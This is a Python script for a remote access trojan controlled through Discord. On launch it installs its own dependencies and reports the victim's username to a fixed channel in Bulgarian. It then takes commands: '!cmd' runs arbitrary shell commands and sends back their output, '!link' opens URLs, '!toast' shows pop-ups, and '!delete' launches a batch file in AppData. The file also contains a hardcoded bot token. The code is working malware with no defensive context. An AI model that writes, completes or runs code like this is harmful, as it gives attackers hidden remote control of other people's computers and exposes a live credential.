import os
try:
    import discord
    import subprocess
    from plyer import notification
except ImportError:
    os.system("pip install discord")
    os.system("pip install plyer")
    import discord
    from plyer import notification
    import subprocess

intents = discord.Intents.all()
intents.message_content = True
client = discord.Client(intents=intents)

user_name = os.popen("whoami").read()

@client.event
async def on_ready():
    channel_bot = client.get_channel(974337173312634913)
    await channel_bot.send(f'ИМА ВРЪЗКА! Име на устройството:`{user_name}`')

@client.event
async def on_message(message):
    if message.author == client.user:
        return
    if "!toast " in message.content:
        getmsgtext = str(message.content).replace("!toast ", "").partition(":")[2]
        getmsgtitle = str(message.content).replace("!toast ","").partition(":")[0]
        notification.notify(title =getmsgtitle,message = getmsgtext,timeout = 10)
    if "!link " in message.content:
        os.system("start " + str(message.content).partition("!link ")[2])
    if "!cmd " in message.content:
        send = os.popen(str(message.content).partition('!cmd')[2]).read()
        await message.channel.send(send)
    if "!stop" in message.content:
        exit()
    if "!delete" in message.content:
        os.startfile(f"C://Users//{user_name}//AppData//Roaming//sys.bat")
        exit()
client.run("OTY3MTM5OTEyMzQ2MzkwNTc4.Gti3_c.9GD9NBtBMLhpL9GtrmHBOE8A8kTzTKGgkZ-OUk")
